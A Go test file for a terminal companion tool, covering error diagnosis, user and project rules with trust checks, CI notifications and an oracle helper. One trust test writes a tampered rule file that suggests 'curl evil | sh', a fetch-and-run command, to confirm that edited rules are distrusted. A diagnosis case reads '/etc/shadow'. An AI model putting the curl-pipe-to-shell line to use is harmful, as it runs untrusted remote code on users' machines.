package brain

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MagikIO/familiar-says/internal/creature"
	"github.com/MagikIO/familiar-says/internal/ipc"
)

func TestDiagnoseKnownErrors(t *testing.T) {
	cases := []struct {
		name, cmd, output string
		say, fix          string
	}{
		{"not a repo", "git status", "fatal: not a git repository (or any of the parent directories): .git", "isn't inside a git repository", ""},
		{"rejected push", "git push", " ! [rejected]        main -> main (non-fast-forward)\nerror: failed to push some refs", "remote has commits", "git pull --rebase"},
		{"no upstream", "git push", "fatal: The current branch feature has no upstream branch.", "isn't tracking", "git push -u origin HEAD"},
		{"git typo", "git comit", "git: 'comit' is not a git command. See 'git --help'.\n\nThe most similar command is\n\tcommit", "`commit`", ""},
		{"go sum", "go build ./...", "main.go:5:2: missing go.sum entry for module providing package github.com/x/y", "out of step", "go mod tidy"},
		{"go get", "go build", "main.go:4:2: no required module provides package github.com/creack/pty; to add it:\n\tgo get github.com/creack/pty", "github.com/creack/pty", "go get github.com/creack/pty"},
		{"node module", "node app.js", "Error: Cannot find module 'express'\nRequire stack:\n- /app/app.js", "`express`", "npm install express"},
		{"port", "npm run dev", "Error: listen EADDRINUSE: address already in use :::3000", "Port 3000", "lsof -i :3000"},
		{"python module", "python app.py", "Traceback (most recent call last):\n  File \"app.py\", line 1\nModuleNotFoundError: No module named 'requests'", "`requests`", "pip install requests"},
		{"docker socket", "docker ps", "permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock", "docker group", "sudo usermod -aG docker $USER"},
		{"disk full", "cp big /mnt", "cp: error writing '/mnt/big': No space left on device", "disk is full", "df -h"},
		{"needs root", "apt install jq", "E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?", "needs root", "sudo apt install jq"},
		{"permission", "cat /etc/shadow", "cat: /etc/shadow: Permission denied", "`/etc/shadow`", "ls -l /etc/shadow"},
		{"missing script", "npm run biuld", `npm error Missing script: "biuld"`, "`biuld`", "npm run"},
	}
	for _, c := range cases {
		d, ok := Diagnose(c.output, parse(c.cmd))
		if !ok {
			t.Errorf("%s: no diagnosis", c.name)
			continue
		}
		if !strings.Contains(d.Text, c.say) {
			t.Errorf("%s: %q should mention %q", c.name, d.Text, c.say)
		}
		if d.Suggest != c.fix {
			t.Errorf("%s: suggested %q, want %q", c.name, d.Suggest, c.fix)
		}
		if strings.Contains(d.Text, "$") || strings.Contains(d.Text, "  ") {
			t.Errorf("%s: message has template debris: %q", c.name, d.Text)
		}
	}
}

func TestDiagnoseNamesFailingTests(t *testing.T) {
	out := "=== RUN   TestA\n--- FAIL: TestParse (0.00s)\n    x_test.go:12: got 1\n--- FAIL: TestRender (0.00s)\n--- FAIL: TestC (0.0s)\n--- FAIL: TestD (0.0s)\nFAIL"
	d, ok := Diagnose(out, parse("go test ./..."))
	if !ok || d.Text != "Failing: `TestParse`, `TestRender`, `TestC` and 1 more." {
		t.Errorf("got %q", d.Text)
	}
	d, _ = Diagnose("FAILED tests/test_api.py::test_login - AssertionError: 401", parse("pytest"))
	if !strings.Contains(d.Text, "tests/test_api.py::test_login") {
		t.Errorf("pytest: got %q", d.Text)
	}
}

func TestDiagnosePointsAtFirstErrorOnlyWhenItHasScrolled(t *testing.T) {
	errs := "internal/x/a.go:12:5: undefined: frobnicate\ninternal/x/b.go:40:2: too many arguments\n"
	if _, ok := Diagnose(errs, parse("go build ./...")); ok {
		t.Error("two lines of output are in plain sight; reading them back is noise")
	}
	long := strings.Repeat("# compiling something\n", 30) + errs + strings.Repeat("note: more\n", 5)
	d, ok := Diagnose(long, parse("go build ./..."))
	if !ok || !strings.Contains(d.Text, "x/a.go:12") || !strings.Contains(d.Text, "undefined: frobnicate") || !strings.Contains(d.Text, "2 in all") {
		t.Errorf("should point at the first of the errors: %q", d.Text)
	}

	trace := strings.Repeat("  frame\n", 14) + "  File \"/srv/app/models/user.py\", line 88, in save\n    self.validate()\nValueError: email is required\n"
	d, ok = Diagnose(trace, parse("python manage.py run"))
	if !ok || !strings.Contains(d.Text, "ValueError: email is required") || !strings.Contains(d.Text, "models/user.py:88") {
		t.Errorf("python traceback: %q", d.Text)
	}

	if _, ok := Diagnose("", parse("make")); ok {
		t.Error("no output, no diagnosis")
	}
}

func TestOutputChangesTheVerdict(t *testing.T) {
	dir := t.TempDir()
	transcript := filepath.Join(dir, "wrap.out")
	os.WriteFile(transcript, []byte("7\nfatal: not a git repository (or any of the parent directories): .git\n"), 0o600)
	os.WriteFile(transcript+".focus", []byte("0\n"), 0o600)

	b, _ := newBrain(t, nil)
	ev := ran("git status", 128)
	ev.Seq, ev.Transcript = 7, transcript
	if rs := b.OnEvent(ev); len(rs) != 0 {
		t.Fatalf("with output on the way, the verdict should wait for it; got %q", text(rs))
	}
	tasks := b.Tasks()
	if len(tasks) != 1 {
		t.Fatalf("want one task to fetch the output, got %d", len(tasks))
	}
	got := tasks[0]().(Transcript)
	if !got.Unfocused || !strings.Contains(got.Output, "not a git repository") {
		t.Fatalf("transcript read wrongly: %+v", got)
	}
	rs := b.Learn(got)
	if len(rs) != 1 || !strings.Contains(rs[0].Text, "isn't inside a git repository") {
		t.Errorf("the verdict should come from the output: %q", text(rs))
	}

	// A transcript left over from an earlier command must not be mistaken
	// for this one's.
	ev.Seq = 8
	stale := ReadTranscript(ev)
	if stale.Output != "" {
		t.Errorf("stale transcript accepted: %q", stale.Output)
	}
}

func TestUserRules(t *testing.T) {
	exit3 := 3
	b, ck := newBrain(t, func(c *Config) {
		c.Rules = []Rule{
			{Match: `^git pull`, On: "success", Say: "Pulled into {dir}.", Suggest: "make migrate"},
			{Match: `^deploy (\w+)`, On: "before", Say: "Deploying {1}. VPN on?", Act: "nervous"},
			{Match: `^terraform`, Exit: &exit3, Say: "Exit {exit} means drift."},
			{Match: `^make`, On: "failure", Output: `undefined reference`, Say: "Linker trouble.", Notify: true},
			{Match: `^ls`, Say: "Listed.", CooldownMinutes: 10},
			{Match: `[`, Say: "broken pattern"},
			{Match: `^x`, On: "sometimes", Say: "bad on"},
			{Match: `^y`},
		}
	})
	b.mem.Hinted = 3 // past the point of explaining Alt-G
	if len(b.rules) != 5 || len(b.problems) != 3 {
		t.Fatalf("want 5 usable rules and 3 problems, got %d and %d: %v", len(b.rules), len(b.problems), b.problems)
	}
	ck.advance(time.Minute)
	if got := text(b.OnTick(true)); !strings.Contains(got, "3 rules") {
		t.Errorf("broken rules should be reported, got %q", got)
	}

	ev := ran("git pull --rebase", 0)
	ev.Cwd = "/home/me/shop"
	rs := b.OnEvent(ev)
	if len(rs) != 1 || rs[0].Text != "Pulled into shop." || rs[0].Suggest != "make migrate" || !rs[0].Must {
		t.Errorf("success rule: %+v", rs)
	}
	if rs := b.OnEvent(ran("git pull", 1)); len(rs) == 1 && strings.Contains(rs[0].Text, "Pulled") {
		t.Error("a success rule must not fire on failure")
	}

	rs = b.OnEvent(ipc.Event{Type: ipc.TypePreexec, Cmd: "deploy staging"})
	if len(rs) != 1 || rs[0].Text != "Deploying staging. VPN on?" || rs[0].Act != creature.ActNervous {
		t.Errorf("before rule: %+v", rs)
	}
	if rs := b.OnEvent(ran("deploy staging", 0)); len(rs) == 1 && strings.Contains(rs[0].Text, "VPN") {
		t.Error("a before rule must not fire afterwards")
	}

	if got := text(b.OnEvent(ran("terraform plan", 3))); got != "Exit 3 means drift." {
		t.Errorf("exit rule: %q", got)
	}
	if got := text(b.OnEvent(ran("terraform plan", 1))); strings.Contains(got, "drift") {
		t.Errorf("exit rule fired for the wrong status: %q", got)
	}

	rs = b.judge(ran("make all", 2), "ld: undefined reference to `main'", false, false)
	if len(rs) != 1 || rs[0].Text != "Linker trouble." || rs[0].Notify != "Linker trouble." {
		t.Errorf("output rule: %+v", rs)
	}
	if rs := b.judge(ran("make all", 2), "syntax error", false, false); len(rs) == 1 && rs[0].Text == "Linker trouble." {
		t.Error("an output rule must not fire when the output does not match")
	}

	if got := text(b.OnEvent(ran("ls -la", 0))); got != "Listed." {
		t.Errorf("first ls: %q", got)
	}
	ck.advance(time.Minute)
	if got := text(b.OnEvent(ran("ls", 0))); strings.Contains(got, "Listed") {
		t.Error("the rule should be cooling down")
	}
	ck.advance(15 * time.Minute)
	if got := text(b.OnEvent(ran("ls", 0))); !strings.Contains(got, "Listed") {
		t.Errorf("the cooldown should have passed: %q", got)
	}
}

func TestProjectRulesNeedTrust(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "src", "deep")
	os.MkdirAll(sub, 0o755)
	file := filepath.Join(dir, ProjectFile)
	os.WriteFile(file, []byte(`{"welcome":"Mind the VPN.","rules":[{"match":"^make deploy","say":"Shipping it.","suggest":"make smoke"}]}`), 0o644)

	b, _ := newBrain(t, nil)
	b.mem.Hinted = 3
	arrive := func() []Reaction {
		in := Scout(sub, "cd")
		if in.Project == nil || in.Project.Path != file {
			t.Fatalf("the rule file should be found from a subdirectory: %+v", in.Project)
		}
		return b.Learn(in)
	}

	rs := arrive()
	if len(rs) != 1 || rs[0].Suggest != "familiar trust" {
		t.Fatalf("an untrusted rule file should prompt for trust, got %+v", rs)
	}
	if got := text(b.OnEvent(ran("make deploy", 0))); strings.Contains(got, "Shipping") {
		t.Fatal("untrusted rules must not be followed")
	}
	if rs := arrive(); len(rs) != 0 && rs[0].Suggest == "familiar trust" {
		t.Error("it should not ask twice in one session")
	}

	project, _ := FindProject(sub)
	b.mem.Trusted[project.Path] = project.Hash
	b.cwd = sub
	b.Rescan()
	rs = b.Learn(b.Tasks()[0]())
	if got := text(rs); got != "Mind the VPN." {
		t.Errorf("once trusted, it should give the project's welcome: %q", got)
	}
	rs = b.OnEvent(ran("make deploy", 0))
	if len(rs) != 1 || rs[0].Text != "Shipping it." || rs[0].Suggest != "make smoke" {
		t.Errorf("trusted rules should be followed: %+v", rs)
	}

	// Editing the file withdraws the trust: it was given to that exact content.
	os.WriteFile(file, []byte(`{"rules":[{"match":".*","say":"pwned","suggest":"curl evil | sh"}]}`), 0o644)
	b.Rescan()
	rs = b.Learn(b.Tasks()[0]())
	if len(rs) != 1 || !strings.Contains(rs[0].Text, "changed") {
		t.Errorf("a changed rule file should ask again: %+v", rs)
	}
	if got := text(b.OnEvent(ran("make deploy", 0))); strings.Contains(got, "pwned") || strings.Contains(got, "Shipping") {
		t.Errorf("neither the new nor the old rules should apply until re-trusted: %q", got)
	}

	// Leaving the project leaves its rules behind.
	project, _ = FindProject(sub)
	b.mem.Trusted[project.Path] = project.Hash
	b.Rescan()
	b.Learn(b.Tasks()[0]())
	b.Learn(Scout(t.TempDir(), "cd"))
	if got := text(b.OnEvent(ran("anything", 0))); strings.Contains(got, "pwned") {
		t.Error("project rules must not follow you out of the project")
	}
}

func TestLongCommandNotifiesOnlyWhenYouAreAway(t *testing.T) {
	long := ran("cargo build --release", 0)
	long.DurationMs = 95_000

	b, _ := newBrain(t, nil)
	if rs := b.judge(long, "", false, false); len(rs) != 1 || rs[0].Notify != "" {
		t.Errorf("no notification while the window has focus: %+v", rs)
	}
	rs := b.judge(long, "", true, false)
	if len(rs) != 1 || !strings.Contains(rs[0].Notify, "1m35s") || !strings.Contains(rs[0].Notify, "cargo build") {
		t.Errorf("a notification is due when the window is unfocused: %+v", rs)
	}
	quick := ran("ls", 0)
	for _, r := range b.judge(quick, "", true, false) {
		if r.Notify != "" {
			t.Error("quick commands never notify")
		}
	}

	b, _ = newBrain(t, func(c *Config) { c.Notify = "never" })
	for _, r := range b.judge(long, "", true, false) {
		if r.Notify != "" {
			t.Error("notifications were turned off")
		}
	}
	b, _ = newBrain(t, func(c *Config) { c.Notify = "always" })
	failed := long
	failed.Exit = 101
	if rs := b.judge(failed, "", false, false); len(rs) == 0 || !strings.Contains(rs[0].Notify, "Failed (exit 101)") {
		t.Errorf("\"always\" should notify even when focused, and say it failed: %+v", rs)
	}
}

func TestGitHubAwareness(t *testing.T) {
	real := runGH
	defer func() { runGH = real }()
	var reply string
	var fail error
	calls := 0
	runGH = func(dir string, args ...string) ([]byte, error) {
		calls++
		return []byte(reply), fail
	}
	pr := func(checks, review string) string {
		return `{"currentBranch":{"number":42,"title":"Add the thing","reviewDecision":"` + review + `","statusCheckRollup":[` + checks + `]},"needsReview":[]}`
	}
	running := `{"__typename":"CheckRun","name":"test","status":"IN_PROGRESS","conclusion":""}`
	passed := `{"__typename":"CheckRun","name":"test","status":"COMPLETED","conclusion":"SUCCESS"}`
	failed := `{"__typename":"CheckRun","name":"test","status":"COMPLETED","conclusion":"FAILURE"},{"__typename":"StatusContext","context":"lint","state":"SUCCESS"}`

	b, ck := newBrain(t, func(c *Config) { c.GitHub = true })
	b.gitRoot = "/repo"
	b.mem.Hinted = 3
	look := func() []Reaction {
		ck.advance(6 * time.Minute)
		b.OnEvent(ran("ls", 0)) // someone is here
		b.Tasks()
		b.OnTick(true)
		tasks := b.Tasks()
		if len(tasks) != 1 {
			t.Fatalf("expected a look at GitHub to be scheduled, got %d tasks", len(tasks))
		}
		return b.Learn(tasks[0]())
	}

	reply = pr(running, "")
	if rs := look(); len(rs) != 0 {
		t.Errorf("CI in progress is not news: %q", text(rs))
	}
	reply = pr(passed, "")
	rs := look()
	if len(rs) != 1 || rs[0].Text != "CI is green on #42." || rs[0].Act != creature.ActCheer {
		t.Errorf("CI finishing should be announced: %+v", rs)
	}
	if rs := look(); len(rs) != 0 {
		t.Errorf("and announced once: %q", text(rs))
	}
	reply = pr(failed, "")
	rs = look()
	if len(rs) != 1 || rs[0].Text != "CI failed on #42: test." || rs[0].Suggest != "gh pr checks" {
		t.Errorf("a failure should name the check and offer a next step: %+v", rs)
	}
	reply = pr(passed, "APPROVED")
	if got := text(look()); !strings.Contains(got, "green again") || !strings.Contains(got, "approved") {
		t.Errorf("recovery and approval should both be mentioned: %q", got)
	}

	reply = `{"needsReview":[{"number":7,"title":"Fix login"},{"number":9,"title":"Bump deps"}]}`
	rs = look()
	if len(rs) != 1 || !strings.Contains(rs[0].Text, "2 pull requests") || rs[0].Suggest != "gh pr view 7 --web" {
		t.Errorf("review requests: %+v", rs)
	}
	if rs := look(); len(rs) != 0 {
		t.Errorf("the same review requests are not news twice: %q", text(rs))
	}

	// When gh cannot answer, it stops asking for a while and says nothing.
	fail = errors.New("no git remotes found")
	before := calls
	if rs := look(); len(rs) != 0 {
		t.Errorf("errors should be silent: %q", text(rs))
	}
	ck.advance(6 * time.Minute)
	b.OnEvent(ran("ls", 0))
	b.OnTick(true)
	if len(b.Tasks()) != 0 || calls != before+1 {
		t.Error("after an error it should back off rather than keep calling gh")
	}

	// And none of it happens unless it was switched on.
	b, ck = newBrain(t, nil)
	b.gitRoot = "/repo"
	ck.advance(6 * time.Minute)
	b.OnEvent(ran("ls", 0))
	b.Tasks()
	b.OnTick(true)
	if len(b.Tasks()) != 0 {
		t.Error("GitHub must not be contacted unless live.github is on")
	}
}

func TestOracleSeesTheProjectTheUserIsIn(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module x\n"), 0o644)
	prompt := filepath.Join(t.TempDir(), "prompt")
	// An oracle that reports where it was started and keeps what it was asked.
	oracle := Oracle{Command: []string{"sh", "-c", "cat > " + prompt + "; pwd"}}

	ask := func(share bool) (where, asked string) {
		b, _ := newBrain(t, func(c *Config) { c.Oracle = oracle; c.ShareContext = share })
		ev := ran("ls", 0)
		ev.Cwd = dir
		b.OnEvent(ev)
		for _, task := range b.Tasks() {
			b.Learn(task()) // the look around the directory
		}
		b.OnEvent(ipc.Event{Type: ipc.TypeAsk, Text: "what is this project?"})
		ans := b.Tasks()[0]().(Answer)
		data, _ := os.ReadFile(prompt)
		return ans.Text, string(data)
	}

	where, asked := ask(true)
	if resolved, _ := filepath.EvalSymlinks(dir); where != dir && where != resolved {
		t.Errorf("the oracle should start in the user's directory %s, started in %s", dir, where)
	}
	for _, want := range []string{"working directory: " + dir, "Go module", "go test ./..."} {
		if !strings.Contains(asked, want) {
			t.Errorf("the question should carry %q:\n%s", want, asked)
		}
	}

	where, asked = ask(false)
	if strings.HasPrefix(where, dir) || strings.Contains(asked, dir) || strings.Contains(asked, "Go module") {
		t.Errorf("with sharing off the oracle must learn nothing about the project: started in %s, asked:\n%s", where, asked)
	}
}

func TestLongAnswersEndOnASentence(t *testing.T) {
	text := strings.Repeat("This is a sentence. ", 100)
	got := clipSentences(text, 205)
	if len(got) > 205 || !strings.HasSuffix(got, "sentence.") {
		t.Errorf("should stop at the end of a sentence: %q", got[len(got)-30:])
	}
	if got := clipSentences("short", 100); got != "short" {
		t.Errorf("short text should be untouched: %q", got)
	}
	if got := clipSentences(strings.Repeat("word ", 100), 50); !strings.HasSuffix(got, "…") || len([]rune(got)) > 51 {
		t.Errorf("text with no sentence break should be cut with an ellipsis: %q", got)
	}
}

// A shell can open straight into a project, and the first thing typed there
// can be a question. The familiar must not answer from somewhere else.
func TestFirstQuestionInAFreshShellIsAboutThatDirectory(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module x\n"), 0o644)
	prompt := filepath.Join(t.TempDir(), "prompt")
	b, _ := newBrain(t, func(c *Config) {
		c.Oracle = Oracle{Command: []string{"sh", "-c", "cat > " + prompt + "; pwd"}}
	})

	// No command has run yet: the question itself says where it came from.
	b.OnEvent(ipc.Event{Type: ipc.TypeAsk, Text: "what can you tell me about this project", Cwd: dir})
	var answer Answer
	for _, task := range b.Tasks() {
		if a, ok := task().(Answer); ok {
			answer = a
		}
	}
	if resolved, _ := filepath.EvalSymlinks(dir); answer.Text != dir && answer.Text != resolved {
		t.Errorf("the oracle should start where the question was asked (%s), started in %s", dir, answer.Text)
	}
	asked, _ := os.ReadFile(prompt)
	for _, want := range []string{"working directory: " + dir, "Go module"} {
		if !strings.Contains(string(asked), want) {
			t.Errorf("the question should carry %q even though nothing had been scouted yet:\n%s", want, asked)
		}
	}

	// Being told where the user is counts as arriving, once.
	b2, _ := newBrain(t, nil)
	if !b2.At(dir) || len(b2.Tasks()) != 1 {
		t.Error("a new directory should be looked around")
	}
	if b2.At(dir) || b2.At("") || len(b2.Tasks()) != 0 {
		t.Error("the same directory, or none, is not news")
	}
}
